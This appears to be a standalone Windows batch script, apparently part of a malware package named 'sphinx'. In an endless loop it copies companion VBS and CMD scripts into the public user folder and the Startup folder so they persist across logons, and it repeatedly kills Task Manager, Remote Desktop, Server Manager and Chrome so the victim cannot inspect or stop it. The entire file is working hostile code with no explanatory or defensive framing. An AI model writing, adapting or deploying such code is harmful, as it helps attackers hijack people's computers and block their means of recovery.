@echo off

:loop
copy sphinx.vbs "C:\Users\Public\"
wmic process where "name='mstsc.exe'" delete
wmic process where "name='Taskmgr.exe'" delete
wmic process where "name='ServerManager.exe'" delete
wmic process where "name='chrome.exe'" delete

if exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\sphinx1.vbs" (
goto :main
)else (
copy sphinx1.vbs "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
goto :main
)

:main
wmic process where "name='mstsc.exe'" delete
wmic process where "name='Taskmgr.exe'" delete
wmic process where "name='ServerManager.exe'" delete

if exist "C:\Users\Public\sphinx.cmd" (
goto :mainf
)else (
copy sphinx.cmd "C:\Users\Public\"
goto :mainf
)

:mainf
copy sphinx.cmd "C:\Users\Public"
wmic process where "name='mstsc.exe'" delete
wmic process where "name='Taskmgr.exe'" delete
wmic process where "name='ServerManager.exe'" delete

goto :loop